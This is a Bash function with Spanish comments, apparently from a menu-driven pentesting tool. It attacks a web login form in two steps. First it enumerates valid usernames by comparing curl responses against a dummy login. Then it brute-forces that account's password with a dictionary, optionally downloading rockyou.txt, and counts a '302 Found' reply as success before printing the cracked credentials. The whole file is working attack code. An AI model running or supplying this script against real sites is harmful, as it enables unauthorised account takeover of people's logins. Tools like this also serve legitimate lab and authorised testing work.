#!/bin/bash
diccionario() {
#!/bin/bash
start=1
URL=$url
document=a.txt
read -r -p "Dime un usuario o un fichero txt con un listado de usuarios, deja en blanco para la demo." document
#Comprobamos que el usuario haya contestado y sino le asignamos el valor que se usa en la demo
if [ -z "$document" ]
then
    document=a.txt
fi
ok=0
vale=0
#Una vez declarados todos los valores y preparado todo, empezamos comprobando el listado de usuarios o nombre de usuario designado, en caso de que sea un listado se hace lo siguiente. 
if [ -f  "$document" ]
then
    echo "Recuerda que este proceso puede tardar minutos."
    total=$(wc -l < "$document")
    #por tantas lineas de documento ejecutamos un script que haga que compruebe si la url de error es diferente en cada caso
    while [ "$start" -le "$total" ]
        do
        test=$(awk "NR==$start{print $1}" $document)
        caca=$(curl -s -d "username=a&password=a" "$URL")
        oki=$(curl -s -d "username=$test&password=a" "$URL")
        if [ "$oki" != "$caca" ]
        then
            username=$test
            vale=1
            break
        fi
        #si la url de error es diferente, significa que hemos encontrado el nombre de usuario.
        start=$((start + 1))
    done
else
#si nos han pasado un solo nombre de usuario en vez de una variable se hace la misma comprobacion sin el bucle
    if [ $(curl -s -d "username=$document&password=a" "$URL") != $(curl -s -d "username=a&password=a" "$URL") ]
        then
            username=$document
            vale=1
        else
            echo "Usuario inexistente.\n"
            'volvermenu'
        fi
fi
#si da error  cerramos el programa
if [ "$vale" != 1 ]
then
    echo "No hemos podido encontrar un usuario valido."
    'volvermenu'
fi
#Solicitamos que el usuario nos pase un diccioanrio de contraseñas que puede haber generado con Jhon the ripper o sino podemos utilizar el de demos o el rockyou 
read -r -p "Quieres utilizar un diccionario de contraseñas en especifico? Indica la ruta del fichero de ser así, si no omite la respuesta." document
if [ -f  "$document" ] 
then
    echo "Fichero valido."
else
    echo "El Fichero no es valido, usaremos un diccionario propio."
#Si ha dejado en blanco el campo usaremos rockyou o la demo
    if [ -z "$document" ]
    then
        read -r -p "Quieres utilizar rockyou? Si quieres usar la demo omite la respuesta." document
        if [ -z "$document" ]
        then
            document=b.txt
        else
            wget -q "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
            document=rockyou.txt
        fi
    fi
fi
start=1
total=$(wc -l < "$document")
#ahora que disponemos de un documento de contraseñas utilizamos el usuario previamente encontrado y ejecutamos el test de contraseñas buscando que la respuesta del servidor sea una redirección.
while [ "$start" -le "$total" ]
    do
    test=$(awk "NR==$start{print $1}" $document)
    if curl -i -s -d "username=$username&password=$test" "$URL" | grep -q "302 Found"
    then
        password=$test
        ok=1
        break
    fi
    start=$(($start + 1))
done
#si hemos descargado anteriormente rockyou.txt, lo borramos
if [ -f  rockyou.txt ]
then
    rm rockyou.txt
fi
#ahora muestra los resultados por pantalla
if [ "$ok" -eq 1 ]
then
    echo "El usuario es $username y su contraseña és $password ."
    'volvermenu'
else
    echo "El usuario es $username ."
    echo "La contraseña no se encuentra en el diccionario, lo sentimos."
    'volvermenu'
fi
}
